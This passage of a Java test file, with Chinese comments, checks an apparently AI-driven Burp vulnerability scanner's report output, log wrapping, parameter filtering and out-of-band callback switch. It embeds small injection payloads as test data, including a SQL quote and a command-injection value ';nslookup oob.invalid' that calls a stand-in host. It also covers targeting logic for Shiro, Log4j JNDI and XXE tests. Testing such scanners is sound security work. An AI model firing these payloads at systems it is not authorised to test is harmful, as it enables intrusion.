                html.contains("<title>") && html.indexOf("<title>") < html.indexOf("</title>")
                        && html.contains("<title>Zack-AI-Scanner Vulnerability Report"),
                html.lines().filter(l -> l.contains("</title>")).findFirst().orElse("(没有 </title> 行)"));
        check("报告里的「未记录/无」也走了文案表（英文下不带中文）",
                !md.contains("未记录") && !md.contains("无（本次未发出任何载荷）"), "");
    }

    static void checkTestParamsInReport() throws Exception {
        com.zackai.model.ScanTask tested = new com.zackai.model.ScanTask(7, null, "POST", "http://t/q");
        tested.setStatus(com.zackai.model.ScanTask.TaskStatus.FINISHED);
        tested.setTestParams("username, header:X-Forwarded-For");

        java.io.File mdFile = java.io.File.createTempFile("zack-tp-", ".md");
        java.io.File htmlFile = java.io.File.createTempFile("zack-tp-", ".html");
        mdFile.deleteOnExit();
        htmlFile.deleteOnExit();
        com.zackai.util.ReportGenerator.generateMarkdownReport(tested, mdFile.getAbsolutePath());
        com.zackai.util.ReportGenerator.generateReport(tested, htmlFile.getAbsolutePath());
        String md = new String(java.nio.file.Files.readAllBytes(mdFile.toPath()),
                java.nio.charset.StandardCharsets.UTF_8);
        String html = new String(java.nio.file.Files.readAllBytes(htmlFile.toPath()),
                java.nio.charset.StandardCharsets.UTF_8);

        check("Markdown 报告里的测试参数就是实际测过的位置",
                md.contains("- 测试参数: username, header:X-Forwarded-For"), md.lines()
                        .filter(l -> l.contains("测试参数")).findFirst().orElse("(没有这一行)"));
        check("HTML 报告里的测试参数就是实际测过的位置",
                html.contains(">username, header:X-Forwarded-For<"), "HTML 里没写对");

        com.zackai.model.ScanTask nothing = new com.zackai.model.ScanTask(8, null, "GET", "http://t/q");
        nothing.setStatus(com.zackai.model.ScanTask.TaskStatus.FINISHED);
        java.io.File mdFile2 = java.io.File.createTempFile("zack-tp0-", ".md");
        java.io.File htmlFile2 = java.io.File.createTempFile("zack-tp0-", ".html");
        mdFile2.deleteOnExit();
        htmlFile2.deleteOnExit();
        com.zackai.util.ReportGenerator.generateMarkdownReport(nothing, mdFile2.getAbsolutePath());
        com.zackai.util.ReportGenerator.generateReport(nothing, htmlFile2.getAbsolutePath());
        String md2 = new String(java.nio.file.Files.readAllBytes(mdFile2.toPath()),
                java.nio.charset.StandardCharsets.UTF_8);
        String html2 = new String(java.nio.file.Files.readAllBytes(htmlFile2.toPath()),
                java.nio.charset.StandardCharsets.UTF_8);

        check("一个载荷都没发时明确写「无」而不是留空或列候选参数",
                md2.contains("- 测试参数: 无（本次未发出任何载荷）")
                        && html2.contains(">无（本次未发出任何载荷）<"),
                "Markdown 里是: " + md2.lines().filter(l -> l.contains("测试参数"))
                        .findFirst().orElse("(没有这一行)"));
    }

    /** 日志层：不叠双标签、错误不配分隔线、面板有行数上限、载荷文本要转义换行并限长 */
    static void checkLogLayer() throws Exception {
        com.zackai.ui.LogPanel panel = new com.zackai.ui.LogPanel();
        panel.logStep("[步骤1] 正在发送原始请求到目标...");
        panel.logInfo("没有方括号的普通消息");
        panel.logError("[发送错误] 请求失败: ConnectException");
        String text = logText(panel);
        check("调用方已有 [标签] 时不再叠一层 [STEP]/[INFO]（此前每行两个标签）",
                text.contains("[步骤1] 正在发送原始请求到目标") && !text.contains("[STEP]"), text);
        check("没有标签的消息仍然补上级别", text.contains("[INFO] 没有方括号的普通消息"), text);
        check("错误只占一行、不再上下各配一条分隔线",
                text.lines().filter(l -> l.contains("─────")).count() == 0 && text.contains("[发送错误]"), text);

        check("载荷里的换行被转义成字面 \\n（multipart/XXE 载荷原来会把一条日志撑成多行）",
                "Content-Disposition: form-data;\\nname=\"file\"".equals(AIEngine.loggablePayload(
                        "Content-Disposition: form-data;\r\nname=\"file\"")), AIEngine.loggablePayload(
                        "Content-Disposition: form-data;\r\nname=\"file\""));
        String longPayload = "x".repeat(500);
        String shown = AIEngine.loggablePayload(longPayload);
        check("超长载荷只留前 200 字符并注明原文长度",
                shown.length() < 230 && shown.contains("共 500 字符"), shown);

        // 折行：JTextPane 只在 BreakIterator 给的断点处折行，base64/hex/JSON 这类长串一个断点都没有，
        // 而日志页是 HORIZONTAL_SCROLLBAR_NEVER —— 折不了就被右边裁掉（用户反馈「行过长不能自动换行」）。
        // 断点由 LogPanel.breakLongRuns 在插入前补。
        String base64ish = "rememberMe=" + "A".repeat(400);
        String broken = com.zackai.ui.LogPanel.breakLongRuns(base64ish);
        check("没有断点的超长串被插入了换行（否则 JTextPane 折不了行、右边被裁掉）",
                broken.contains("\n"), "一个换行都没插");
        check("折出来的每一段都不超过宽度预算",
                broken.lines().allMatch(l -> l.length() <= com.zackai.ui.LogPanel.LONG_RUN_LIMIT),
                "最长 " + broken.lines().mapToInt(String::length).max().orElse(-1));
        check("折完之后一个字符都没丢（只插换行，不改内容）",
                base64ish.equals(broken.replace("\n", "")), "内容被改动了");
        check("预算参数说了算（窄窗口传 20 就每 20 个字符断一次）",
                com.zackai.ui.LogPanel.breakLongRuns("A".repeat(100), 20).lines()
                        .allMatch(l -> l.length() <= 20)
                        && com.zackai.ui.LogPanel.breakLongRuns("A".repeat(100), 20).contains("\n"),
                com.zackai.ui.LogPanel.breakLongRuns("A".repeat(100), 20));

        // 宽度变了要跟着重排（txt 编辑器那样）：这里把日志框设窄/设宽，再触发重排，看断点位置是否跟着走。
        // 这条是「动态」二字的全部含义 —— 固定宽度插死断点的话，窗口一变就又不合适了。
        java.lang.reflect.Method rewrap = com.zackai.ui.LogPanel.class.getDeclaredMethod("rewrapIfNeeded");
        rewrap.setAccessible(true);
        java.lang.reflect.Field paneField = com.zackai.ui.LogPanel.class.getDeclaredField("logPane");
        paneField.setAccessible(true);
        com.zackai.ui.LogPanel reflow = new com.zackai.ui.LogPanel();
        final javax.swing.JTextPane reflowPane = (javax.swing.JTextPane) paneField.get(reflow);
        reflow.logInfo("[步骤4] 载荷1/1 → 命令注入 → cmd → " + "C".repeat(600));
        int linesWide = logText(reflow).lines().mapToInt(l -> 1).sum();
        // **在 EDT 上调用**：rewrapIfNeeded 会动文档与视图（产品里由 EDT 上的定时器调），
        // 主线程直接调会和 EDT 自己的布局交错 —— 实测抛 FlowView 里的 NPE
        javax.swing.SwingUtilities.invokeAndWait(() -> {
            reflowPane.setSize(240, 400);
            try {
                rewrap.invoke(reflow);
            } catch (Exception e) {
                throw new IllegalStateException(e);
            }
        });
        int linesNarrow = logText(reflow).lines().mapToInt(l -> 1).sum();
        javax.swing.SwingUtilities.invokeAndWait(() -> {
            reflowPane.setSize(2000, 400);
            try {
                rewrap.invoke(reflow);
            } catch (Exception e) {
                throw new IllegalStateException(e);
            }
        });
        int linesWider = logText(reflow).lines().mapToInt(l -> 1).sum();
        check("窗口变窄后按新宽度重排（断点位置跟着宽度走，不是插死的）",
                linesNarrow > linesWide, "默认 " + linesWide + " 行 → 窄 " + linesNarrow + " 行");
        check("窗口变宽后折行变少（真的会重排回去）",
                linesWider < linesNarrow, "窄 " + linesNarrow + " 行 → 宽 " + linesWider + " 行");
        check("重排只动断点，正文一个字都不变",
                logText(reflow).replace("\n", "")
                        .contains("[步骤4] 载荷1/1 → 命令注入 → cmd → " + "C".repeat(600)),
                "正文被改动了");

        // 上面是直接调重排方法；这条走**真实的监听链**：派发一次 COMPONENT_RESIZED，
        // 等 150ms 防抖定时器在 EDT 上跑完，看文档是不是自己变短了。
        // （用户要的是「跟着窗口走」，监听没接上的话方法再好也不会被调用。）
        // 事件也要在 EDT 上派发：Swing 对「非 EDT 线程触发一次布局」没有任何保护，
        // 实测主线程 dispatchEvent 会让 FlowView 的共享 FlowStrategy 与 EDT 上的布局打架
        // （java.lang.NullPointerException: this.viewBuffer is null）
        javax.swing.SwingUtilities.invokeAndWait(() -> {
            reflowPane.setSize(240, 400);
            reflowPane.dispatchEvent(new java.awt.event.ComponentEvent(
                    reflowPane, java.awt.event.ComponentEvent.COMPONENT_RESIZED));
        });
        int viaListener = 0;
        long deadline = System.currentTimeMillis() + 2000;
        while (System.currentTimeMillis() < deadline) {
            javax.swing.SwingUtilities.invokeAndWait(() -> { });
            viaListener = logText(reflow).lines().mapToInt(l -> 1).sum();
            if (viaListener > linesWider) {
                break;                                   // 已经按窄宽度重排过了
            }
            Thread.sleep(50);
        }
        check("窗口尺寸事件真的会触发重排（监听链是通的，不只是方法能被调用）",
                viaListener > linesWider, "宽 " + linesWider + " 行 → 派发事件后 " + viaListener + " 行");

        // 横向滑动条按需出现（用户 2026-09-24 追加要求：显示不完的能左右拖着看）。
        // 这里把面板放进它自己的滚动面板里量：故意让预算估不准（塞一行宽字符 W，估算按 ASCII 平均宽度），
        // 于是内容比视口宽 —— 那一刻滑动条必须出现，否则超出的部分就是被裁掉、拖都拖不到。
        javax.swing.JScrollPane scroll = (javax.swing.JScrollPane)
                javax.swing.SwingUtilities.getAncestorOfClass(javax.swing.JScrollPane.class, reflowPane);
        check("日志框在自己的滚动面板里", scroll != null, "没找到");
        if (scroll != null) {
            javax.swing.SwingUtilities.invokeAndWait(() -> {
                scroll.setSize(300, 220);
                scroll.doLayout();
                scroll.getViewport().doLayout();
            });
            final boolean[] barWhenOverflow = new boolean[1];
            final int[] paneW = new int[1];
            final int[] viewW = new int[1];
            javax.swing.SwingUtilities.invokeAndWait(() -> {
                barWhenOverflow[0] = scroll.getHorizontalScrollBar().isVisible();
                paneW[0] = reflowPane.getWidth();
                viewW[0] = scroll.getViewport().getExtentSize().width;
            });
            check("内容比视口宽时横向滑动条出现（拖得到行尾，不再是被裁掉）",
                    barWhenOverflow[0] && paneW[0] > viewW[0],
                    "滑动条可见=" + barWhenOverflow[0] + " 面板宽=" + paneW[0] + " 视口宽=" + viewW[0]);

            javax.swing.SwingUtilities.invokeAndWait(() -> {
                scroll.setSize(4000, 220);                     // 视口够宽，内容全放得下
                scroll.doLayout();
                scroll.getViewport().doLayout();
            });
            final boolean[] barWhenFits = new boolean[1];
            javax.swing.SwingUtilities.invokeAndWait(() -> {
                // 宽度变了要让面板按新宽度重排（真实环境里由尺寸事件触发）
                try {
                    rewrap.invoke(reflow);
                } catch (Exception e) {
                    throw new IllegalStateException(e);
                }
                scroll.doLayout();
                scroll.getViewport().doLayout();
                barWhenFits[0] = scroll.getHorizontalScrollBar().isVisible();
            });
            check("内容放得下时滑动条消失（不留一条永远占位的空槽）",
                    !barWhenFits[0], "视口很宽时滑动条仍然可见");
        }

        String chineseLong = "这是一段很长的中文说明，用来确认不会在句子中间被切开。".repeat(10);
        check("中文长句一个字都不插（中文本身就能折行，插了反而把句子切断）",
                chineseLong.equals(com.zackai.ui.LogPanel.breakLongRuns(chineseLong)), "被改动了");
        String spacedLong = "word ".repeat(120);
        check("带空格的英文长句也不动（空格本身就是断点）",
                spacedLong.equals(com.zackai.ui.LogPanel.breakLongRuns(spacedLong)), "被改动了");
        check("短消息原样返回", "abc".equals(com.zackai.ui.LogPanel.breakLongRuns("abc")), "被改动了");

        // 一条消息折成多段时，裁剪计数必须按**段落**加：按消息加的话每次只裁一段、进来的却是好几段，
        // 文档里的段落数会无限增长（MAX_LOG_LINES 这个上限就形同虚设了）
        com.zackai.ui.LogPanel wrapped = new com.zackai.ui.LogPanel();
        String folded = "C".repeat(400);
        wrapped.logInfo(folded);
        javax.swing.SwingUtilities.invokeAndWait(() -> { });
        java.lang.reflect.Field wrappedEntries = com.zackai.ui.LogPanel.class.getDeclaredField("logEntries");
        wrappedEntries.setAccessible(true);
        int counted = (Integer) wrappedEntries.get(wrapped);
        int expected = com.zackai.ui.LogPanel.breakLongRuns(folded).split("\n", -1).length;
        check("一条被折成多段的消息按段数计数（否则每次只裁掉一段、文档会无限长）",
                counted == expected, "计了 " + counted + "，应为 " + expected);

        com.zackai.ui.LogPanel capped = new com.zackai.ui.LogPanel();
        java.lang.reflect.Field maxField = com.zackai.ui.LogPanel.class.getDeclaredField("MAX_LOG_LINES");
        maxField.setAccessible(true);
        int max = (Integer) maxField.get(null);
        int extra = 50;
        for (int i = 0; i < max + extra; i++) {
            capped.logStep("[步骤4] 载荷" + i + " → SQL注入 → id → 1'");
        }
        java.lang.reflect.Field entries = com.zackai.ui.LogPanel.class.getDeclaredField("logEntries");
        entries.setAccessible(true);
        javax.swing.SwingUtilities.invokeAndWait(() -> { });     // 冲掉 EDT 队列再读，否则读到中间状态
        int kept = (Integer) entries.get(capped);
        check("日志面板只保留最近 " + max + " 行（写 " + (max + extra) + " 行后剩 " + kept + "）",
                kept == max, "实际 " + kept);
        String cappedText = logText(capped);
        check("裁掉的是最老的行（最早一条是载荷" + extra + "）",
                cappedText.contains("载荷" + extra + " →") && !cappedText.contains("载荷" + (extra - 1) + " →"),
                cappedText.substring(0, Math.min(80, cappedText.length())));
    }

    /**
     * step2 的 param 过滤：必须与 step3 的 isValidPosition 认同一套位置写法。
     * burp.IParameter 里没有「请求头」和「路径段」类型，只按 Burp 参数名过滤的话，
     * 模型按提示词第 4/6 条给出的 header:X / URL_PATH 映射会被整条丢掉 ——
     * step3 再也看不到它们，请求头与路径注入点全线失守（任务还会以「安全」结束）。
     */
    static void checkStep2ParamFilter() throws Exception {
        // VULN_TYPE_COUNT 是提示词里「N种…」的唯一来源，必须与枚举里的类型数一致
        java.lang.reflect.Field countField = AIEngine.class.getDeclaredField("VULN_TYPE_COUNT");
        countField.setAccessible(true);
        int declared = (Integer) countField.get(null);
        int actual = 0;
        for (com.zackai.model.ScanTask.ScanMode m : com.zackai.model.ScanTask.ScanMode.values()) {
            if (!m.isCustom()) ++actual;
        }
        check("VULN_TYPE_COUNT 与 ScanMode 里的漏洞类型数一致（加类型时不会再漏改提示词里的数字）",
                declared == actual, "常量=" + declared + " 枚举=" + actual);

        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        java.lang.reflect.Method m = AIEngine.class.getDeclaredMethod("normalizeStep2Response",
                String.class, java.util.List.class, byte[].class);
        m.setAccessible(true);
        java.util.List<String> valid = java.util.Arrays.asList("id", "q");

        String json = "{\"analysis\":\"x\",\"paramVulnMap\":["
                + "{\"param\":\"id\",\"vulnTypes\":[\"SQL注入\"]},"
                + "{\"param\":\"ID\",\"vulnTypes\":[\"SQL注入\"]},"
                + "{\"param\":\"header:User-Agent\",\"vulnTypes\":[\"Log4j2 JNDI注入\"]},"
                + "{\"param\":\"X-Forwarded-For\",\"vulnTypes\":[\"SSRF服务端请求伪造\"]},"
                + "{\"param\":\"URL_PATH\",\"vulnTypes\":[\"SQL注入\"]},"
                + "{\"param\":\"URL_PATH[1]\",\"vulnTypes\":[\"SQL注入\"]},"
                + "{\"param\":\"BODY\",\"vulnTypes\":[\"XXE外部实体注入\"]},"
                + "{\"param\":\"auto\",\"vulnTypes\":[\"SQL注入\"]},"
                + "{\"param\":\"URL\",\"vulnTypes\":[\"SQL注入\"]},"
                + "{\"param\":\"header:Host\",\"vulnTypes\":[\"SSRF服务端请求伪造\"]},"
                + "{\"param\":\"csrf_token\",\"vulnTypes\":[\"SQL注入\"]},"
                + "{\"param\":\"not_a_param\",\"vulnTypes\":[\"SQL注入\"]}]}";
        com.google.gson.JsonObject out = (com.google.gson.JsonObject) m.invoke(engine, json, valid, null);
        java.util.Set<String> kept = new java.util.LinkedHashSet<String>();
        for (com.google.gson.JsonElement e : out.getAsJsonArray("paramVulnMap")) {
            kept.add(e.getAsJsonObject().get("param").getAsString());
        }
        check("请求头映射（header:User-Agent）能活到 step3（此前被整条丢掉）",
                kept.contains("header:User-Agent"), kept.toString());
        check("裸白名单头（X-Forwarded-For）同样保留", kept.contains("X-Forwarded-For"), kept.toString());
        check("URL 路径段（URL_PATH / URL_PATH[1]）同样保留",
                kept.contains("URL_PATH") && kept.contains("URL_PATH[1]"), kept.toString());
        check("整段 body 替换（BODY）保留", kept.contains("BODY"), kept.toString());
        check("真实参数名照旧保留（大小写不敏感）",
                kept.contains("id") && kept.contains("ID"), kept.toString());
        check("auto / URL 仍然被丢", !kept.contains("auto") && !kept.contains("URL"), kept.toString());
        check("标准头 header:Host 仍然被丢", !kept.contains("header:Host"), kept.toString());
        check("敏感参数与瞎编的参数仍然被丢",
                !kept.contains("csrf_token") && !kept.contains("not_a_param"), kept.toString());

        // 兜底判据：Burp 参数表覆盖不到的位置，只要请求里**真的存在**就该保留。
        // JSON 嵌套字段名是「叶子名还是全路径」由 Burp 决定，multipart 只报部件属性，
        // XML 元素名也不一定在参数表里 —— 只认 Burp 参数名的话这些映射会被整条丢掉。
        String shapeJson = "{\"analysis\":\"x\",\"paramVulnMap\":["
                + "{\"param\":\"user.id\",\"vulnTypes\":[\"SQL注入\"]},"
                + "{\"param\":\"profile.age\",\"vulnTypes\":[\"SQL注入\"]},"
                + "{\"param\":\"file\",\"vulnTypes\":[\"文件上传\"]},"
                + "{\"param\":\"note\",\"vulnTypes\":[\"XSS跨站脚本\"]}]}";
        byte[] jsonRequest = ("POST /api HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n\r\n"
                + "{\"user\":{\"id\":1},\"profile\":{\"age\":2}}").getBytes(java.nio.charset.StandardCharsets.UTF_8);
        java.util.Set<String> shapeKept = new java.util.LinkedHashSet<String>();
        for (com.google.gson.JsonElement e : ((com.google.gson.JsonObject) m.invoke(engine, shapeJson, valid, jsonRequest))
                .getAsJsonArray("paramVulnMap")) {
            shapeKept.add(e.getAsJsonObject().get("param").getAsString());
        }
        check("body 里真的存在的 JSON 嵌套路径保留（Burp 报叶子名时不会整条丢）",
                shapeKept.contains("user.id") && shapeKept.contains("profile.age"), shapeKept.toString());
        check("body 里不存在的 JSON 路径仍然被丢（放宽没放过头）", !shapeKept.contains("note"), shapeKept.toString());

        byte[] multipartRequest = ("POST /upload HTTP/1.1\r\nHost: x\r\n"
                + "Content-Type: multipart/form-data; boundary=----x\r\n\r\n"
                + "------x\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a.png\"\r\n\r\nPNG\r\n------x--\r\n")
                .getBytes(java.nio.charset.StandardCharsets.UTF_8);
        java.util.Set<String> mpKept = new java.util.LinkedHashSet<String>();
        for (com.google.gson.JsonElement e : ((com.google.gson.JsonObject) m.invoke(engine, shapeJson, valid, multipartRequest))
                .getAsJsonArray("paramVulnMap")) {
            mpKept.add(e.getAsJsonObject().get("param").getAsString());
        }
        check("multipart 里真实存在的部件名保留（Burp 只报 filename 时文件上传仍能发出去）",
                mpKept.contains("file"), mpKept.toString());

        // 宽容读：模型把数组写成字符串/对象是常事，而会抛的 getAsJsonArray 会让**整份回复**作废
        // （外层 catch 成 null → 「分析失败」+ 一个包都不发，用户还会以为是 AI 的问题）。
        String stringyTypes = "{\"analysis\":\"x\",\"paramVulnMap\":[{\"param\":\"id\",\"vulnTypes\":\"SQL注入\"}]}";
        com.google.gson.JsonObject stringyOut = (com.google.gson.JsonObject) m.invoke(engine, stringyTypes, valid, null);
        check("vulnTypes 写成字符串（而非数组）不再让整份回复作废",
                stringyOut != null && stringyOut.getAsJsonArray("paramVulnMap").size() == 1,
                stringyOut == null ? "整份回复被丢（走成分析失败）" : "保留了 " + stringyOut);

        String keyedMap = "{\"analysis\":\"x\",\"paramVulnMap\":{\"id\":[\"SQL注入\"],"
                + "\"q\":{\"vulnTypes\":[\"XSS跨站脚本\"]}}}";
        com.google.gson.JsonObject keyedOut = (com.google.gson.JsonObject) m.invoke(engine, keyedMap, valid, null);
        java.util.Set<String> keyedKept = new java.util.LinkedHashSet<String>();
        if (keyedOut != null && keyedOut.has("paramVulnMap")) {
            for (com.google.gson.JsonElement e : keyedOut.getAsJsonArray("paramVulnMap")) {
                keyedKept.add(e.getAsJsonObject().get("param").getAsString());
            }
        }
        check("paramVulnMap 被写成「键=参数名」的对象时按参数名展开（字段名本身就叫 map）",
                keyedKept.contains("id") && keyedKept.contains("q"), keyedKept.toString());

        String xmlJson = "{\"analysis\":\"x\",\"paramVulnMap\":["
                + "{\"param\":\"userId\",\"vulnTypes\":[\"XXE外部实体注入\"]},"
                + "{\"param\":\"missingElement\",\"vulnTypes\":[\"XXE外部实体注入\"]}]}";
        byte[] xmlRequest = ("POST /s HTTP/1.1\r\nHost: x\r\nContent-Type: text/xml\r\n\r\n"
                + "<?xml version=\"1.0\"?><root><userId>1</userId></root>")
                .getBytes(java.nio.charset.StandardCharsets.UTF_8);
        java.util.Set<String> xmlKept = new java.util.LinkedHashSet<String>();
        for (com.google.gson.JsonElement e : ((com.google.gson.JsonObject) m.invoke(engine, xmlJson, valid, xmlRequest))
                .getAsJsonArray("paramVulnMap")) {
            xmlKept.add(e.getAsJsonObject().get("param").getAsString());
        }
        check("XML body 里存在的元素名同样被认可（不存在的仍然被丢）",
                xmlKept.contains("userId") && !xmlKept.contains("missingElement"), xmlKept.toString());
    }

    /**
     * 位置别名：Step2 与 Step3 对**同一个注入点**常写成不同形态，判据必须是
     * 「指的是不是同一个注入点」而不是「字符串是否相等」。
     *
     * <p>两类都会静默丢载荷：URL_PATH 的下标写法（Step2 写 URL_PATH[1]，
     * Step3 写 URL_PATH —— 折叠前是两个不同的键，路径载荷整类被丢），
     * 以及 Cookie 家族（Step2 写 header:Cookie、Step3 写请求里真实存在的 rememberMe，
     * Shiro 载荷就是这个形态，会被整条丢掉）。
     */
    static void checkPositionAliases() throws Exception {
        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        java.lang.reflect.Method mappedParamsOf = AIEngine.class.getDeclaredMethod(
                "mappedParamsOf", com.google.gson.JsonObject.class, byte[].class);
        mappedParamsOf.setAccessible(true);
        java.lang.reflect.Method isMapped = AIEngine.class.getDeclaredMethod(
                "isMappedPosition", String.class, java.util.Set.class);
        isMapped.setAccessible(true);

        java.util.Set<?> pathMapped = (java.util.Set<?>) mappedParamsOf.invoke(engine,
                com.google.gson.JsonParser.parseString(
                        "{\"paramVulnMap\":[{\"param\":\"URL_PATH[1]\",\"vulnTypes\":[\"SQL注入\"]}]}").getAsJsonObject(),
                null);
        check("Step2 写下标写法时，position=URL_PATH 的载荷也放行（此前 4 条全丢）",
                (Boolean) isMapped.invoke(null, "URL_PATH", pathMapped)
                        && (Boolean) isMapped.invoke(null, "URL_PATH[0]", pathMapped)
                        && (Boolean) isMapped.invoke(null, "URL_PATH[1]", pathMapped), String.valueOf(pathMapped));

        java.util.Set<?> pathMappedBare = (java.util.Set<?>) mappedParamsOf.invoke(engine,
                com.google.gson.JsonParser.parseString(
                        "{\"paramVulnMap\":[{\"param\":\"URL_PATH\",\"vulnTypes\":[\"SQL注入\"]}]}").getAsJsonObject(),
                null);
        check("反过来：Step2 写 URL_PATH、Step3 写下标同样放行",
                (Boolean) isMapped.invoke(null, "URL_PATH[2]", pathMappedBare), String.valueOf(pathMappedBare));
        check("Step2 没点名路径段时 URL_PATH 仍然被丢（别名不等于无条件放行）",
                !(Boolean) isMapped.invoke(null, "URL_PATH",
                        new java.util.LinkedHashSet<String>(java.util.List.of("id"))), "被放行了");

        byte[] cookieRequest = "GET /x HTTP/1.1\r\nHost: x\r\nCookie: rememberMe=abc; sid=1\r\n\r\n"
                .getBytes(java.nio.charset.StandardCharsets.UTF_8);
        java.util.Set<?> cookieMapped = (java.util.Set<?>) mappedParamsOf.invoke(engine,
                com.google.gson.JsonParser.parseString(
                        "{\"paramVulnMap\":[{\"param\":\"header:Cookie\",\"vulnTypes\":[\"Shiro反序列化\"]}]}").getAsJsonObject(),
                cookieRequest);
        check("Step2 写 header:Cookie 时，Step3 写真实 cookie 名（rememberMe）也放行",
                (Boolean) isMapped.invoke(null, "rememberMe", cookieMapped)
                        && (Boolean) isMapped.invoke(null, "header:Cookie", cookieMapped), String.valueOf(cookieMapped));

        java.util.Set<?> cookieMappedName = (java.util.Set<?>) mappedParamsOf.invoke(engine,
                com.google.gson.JsonParser.parseString(
                        "{\"paramVulnMap\":[{\"param\":\"rememberMe\",\"vulnTypes\":[\"Shiro反序列化\"]}]}").getAsJsonObject(),
                cookieRequest);
        check("反过来：Step2 写 rememberMe、Step3 写 header:Cookie 同样放行",
                (Boolean) isMapped.invoke(null, "header:Cookie", cookieMappedName), String.valueOf(cookieMappedName));
        check("请求里没有 cookie 时不会凭空补出 cookie 别名",
                !((java.util.Set<?>) mappedParamsOf.invoke(engine,
                        com.google.gson.JsonParser.parseString(
                                "{\"paramVulnMap\":[{\"param\":\"id\",\"vulnTypes\":[\"SQL注入\"]}]}").getAsJsonObject(),
                        null)).contains("cookie"), "补出来了");

        // 用户实测（2026-09-24，Shiro 靶场）：登录页的 rememberMe 是**表单字段**（rememberMe=on），
        // Cookie 头里只有 JSESSIONID。步骤 2 照请求写 rememberMe，步骤 3 按指南写 header:Cookie
        //（攻击必须往 Cookie 头上加，表单里的同名字段 Shiro 根本不看）—— 上面的 cookieNames 别名
        // 只认请求 Cookie 头里真实存在的名字，认不出「同名表单字段」，于是整轮载荷被判
        //「不在 paramVulnMap 里」丢光，日志只有一句「AI 未生成有效 payload」。
        byte[] shiroForm = ("POST /login.jsp HTTP/1.1\r\nHost: x\r\nCookie: JSESSIONID=1\r\n"
                + "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
                + "username=admin&password=admin&rememberMe=on&submit=Login")
                .getBytes(java.nio.charset.StandardCharsets.UTF_8);
        java.util.Set<?> shiroMapped = (java.util.Set<?>) mappedParamsOf.invoke(engine,
                com.google.gson.JsonParser.parseString(
                        "{\"paramVulnMap\":[{\"param\":\"rememberMe\",\"vulnTypes\":[\"Shiro反序列化\"]}]}").getAsJsonObject(),
                shiroForm);
        check("rememberMe 只以表单字段出现时，Step3 的 header:Cookie 仍然放行（Shiro 靶场的真实形态）",
                (Boolean) isMapped.invoke(null, "header:Cookie", shiroMapped)
                        && (Boolean) isMapped.invoke(null, "Cookie", shiroMapped)
                        && (Boolean) isMapped.invoke(null, "rememberMe", shiroMapped), String.valueOf(shiroMapped));
        check("别名只对 rememberMe 这类 cookie 名生效（普通表单参数不会凭空放行 header:Cookie）",
                !((java.util.Set<?>) mappedParamsOf.invoke(engine,
                        com.google.gson.JsonParser.parseString(
                                "{\"paramVulnMap\":[{\"param\":\"username\",\"vulnTypes\":[\"XSS跨站脚本\"]}]}").getAsJsonObject(),
                        shiroForm)).contains("cookie"), "凭空补出来了");

        java.util.Set<?> headerMapped = (java.util.Set<?>) mappedParamsOf.invoke(engine,
                com.google.gson.JsonParser.parseString(
                        "{\"paramVulnMap\":[{\"param\":\"header:X-Forwarded-For\",\"vulnTypes\":[\"SSRF服务端请求伪造\"]}]}").getAsJsonObject(),
                null);
        check("头部的 header: 前缀差异照旧不影响匹配（裸名与 header: 名等价）",
                (Boolean) isMapped.invoke(null, "X-Forwarded-For", headerMapped)
                        && (Boolean) isMapped.invoke(null, "header:x-forwarded-for", headerMapped),
                String.valueOf(headerMapped));

        // 上传面同样是一个注入点两种拼法：部件名（file）与它的 filename/name 属性。
        // 步骤 2 的提示词让模型「照请求里的写法填」，请求体里写着 filename="a.png"，
        // 步骤 3 的指南却按「position 指向文件字段」写 —— 两边不一致时整类载荷被丢。
        byte[] uploadRequest = ("POST /upload HTTP/1.1\r\nHost: x\r\n"
                + "Content-Type: multipart/form-data; boundary=----x\r\n\r\n"
                + "------x\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a.png\"\r\n\r\nPNG\r\n------x--\r\n")
                .getBytes(java.nio.charset.StandardCharsets.UTF_8);
        java.util.Set<?> partMapped = (java.util.Set<?>) mappedParamsOf.invoke(engine,
                com.google.gson.JsonParser.parseString(
                        "{\"paramVulnMap\":[{\"param\":\"file\",\"vulnTypes\":[\"文件上传\"]}]}").getAsJsonObject(),
                uploadRequest);
        check("Step2 写部件名 file 时，Step3 写 filename 属性也放行",
                (Boolean) isMapped.invoke(null, "filename", partMapped)
                        && (Boolean) isMapped.invoke(null, "file", partMapped), String.valueOf(partMapped));
        check("反过来：Step2 写 filename 属性、Step3 写部件名 file 同样放行",
                (Boolean) isMapped.invoke(null, "file",
                        mappedParamsOf.invoke(engine,
                                com.google.gson.JsonParser.parseString(
                                        "{\"paramVulnMap\":[{\"param\":\"filename\",\"vulnTypes\":[\"文件上传\"]}]}").getAsJsonObject(),
                                uploadRequest)),
                "被丢弃了");
        check("非 multipart 请求不会凭空补出 filename 别名（别名不等于无条件放行）",
                !((java.util.Set<?>) mappedParamsOf.invoke(engine,
                        com.google.gson.JsonParser.parseString(
                                "{\"paramVulnMap\":[{\"param\":\"id\",\"vulnTypes\":[\"SQL注入\"]}]}").getAsJsonObject(),
                        "GET /x HTTP/1.1\r\nHost: x\r\n\r\n".getBytes(java.nio.charset.StandardCharsets.UTF_8)))
                        .contains("filename"), "补出来了");
    }

    /**
     * 外带回连开关：默认开、旧配置键不生效、关掉时载荷不发也不生成、自检失败要给出原因。
     *
     * <p>开关的老坑是「配置文件里残留一个 false → 外带静默失效，只能删文件恢复」。
     * 这里的断言就是钉住那个坑不会再出现：新键名 {@code oobEnabled} 默认 TURE，
     * 历史的 {@code oastEnabled}（哪怕写着 false）读进来也不影响。
     */
    static void checkOobSwitch() throws Exception {
        com.google.gson.Gson gson = new com.google.gson.Gson();
        check("配置里没有开关时默认启用外带回连",
                gson.fromJson("{}", com.zackai.core.ConfigManager.Config.class).isOobEnabled(), "默认关掉了");
        check("历史键 oastEnabled=false 不再能把外带关掉（老配置文件不会静默失效）",
                gson.fromJson("{\"oastEnabled\":false}", com.zackai.core.ConfigManager.Config.class).isOobEnabled(),
                "被历史键关掉了");
        check("显式写 oobEnabled=false 才生效",
                !gson.fromJson("{\"oobEnabled\":false}", com.zackai.core.ConfigManager.Config.class).isOobEnabled(),
                "没生效");

        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        java.lang.reflect.Method skip = AIEngine.class.getDeclaredMethod(
                "shouldSkipOobPayload", String.class, boolean.class, String.class);
        skip.setAccessible(true);
        String oobPayload = ";nslookup oob.invalid";
